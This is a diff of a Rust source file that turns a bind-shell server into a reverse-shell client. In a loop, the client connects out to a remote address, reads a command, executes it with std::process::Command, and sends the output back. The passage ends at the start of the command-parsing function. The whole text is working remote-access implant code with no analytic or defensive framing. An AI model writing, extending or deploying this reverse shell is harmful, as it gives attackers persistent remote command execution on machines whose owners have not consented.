@@ -1,58 +1,59 @@
-use std::io;
 use std::io::Write;
-use std::net::{TcpListener, TcpStream};
+use std::net::TcpStream;
 use std::process::{Command, Output};
+use std::{io, thread, time};
 
-pub fn run(full_address: String) {
-    let tcp_listener = TcpListener::bind(full_address);
+pub fn run(full_address: &str) {
+    let duration = time::Duration::from_secs(2);
+    loop {
+        thread::sleep(duration);
+        println!("Connecting to server at {}", full_address);
+        let stream = TcpStream::connect(full_address).expect("Failed to connect to server");
 
-    match tcp_listener {
-        Ok(listener) => {
-            for stream in listener.incoming() {
-                match stream {
-                    Ok(stream) => handle_stream(stream),
-                    Err(_e) => {}
-                }
-            }
-        }
-        Err(_e) => {}
+        handle_stream(stream);
     }
 }
 
 fn handle_stream(mut stream: TcpStream) {
     let mut command = parse_stream(&stream);
     let output = command.output();
-    match output {
-        Ok(_) => {
-            send_output(&mut stream, &output);
+
+    send_command_feedback(&mut stream, &output).unwrap_or_else(|err| {
+        //todo : when this happen, store message, then retry later on.
+        println!("Failed to send command feedback: {}", err);
+    });
+}
+
+fn send_command_feedback(
+    stream: &mut TcpStream,
+    command_output: &Result<Output, io::Error>,
+) -> Result<(), io::Error> {
+    match command_output {
+        Ok(output) => {
+            send_output(stream, &output)?;
         }
         Err(err) => {
-            send_error(&mut stream, &err);
+            send_error(stream, &err)?;
         }
     }
+    Ok(())
 }
 
-fn send_error(stream: &mut TcpStream, error: &io::Error) {
-    stream
-        .write(&format!("{}", error).as_bytes())
-        .expect("Failed to write to stream");
+fn send_error(stream: &mut TcpStream, error: &io::Error) -> Result<(), io::Error> {
+    let message = format!("{}\n", error);
+    stream.write(&message.as_bytes())?;
+    Ok(())
 }
 
-fn send_output(stream: &mut TcpStream, output: &Result<Output, io::Error>) {
-    let result = match output {
-        Ok(output) => {
-            format!(
-                "\n{}\n{}",
-                String::from_utf8_lossy(&output.stdout),
-                String::from_utf8_lossy(&output.stderr)
-            )
-        }
-        Err(e) => format!("Failed to execute command: {}", e),
-    };
+fn send_output(stream: &mut TcpStream, output: &Output) -> Result<(), io::Error> {
+    let message = format!(
+        "\n{}\n{}\n",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
 
-    stream
-        .write(&result.as_bytes())
-        .expect("Failed to write to stream");
+    stream.write(&message.as_bytes())?;
+    Ok(())
 }
 
 fn parse_stream(stream: &TcpStream) -> Command {
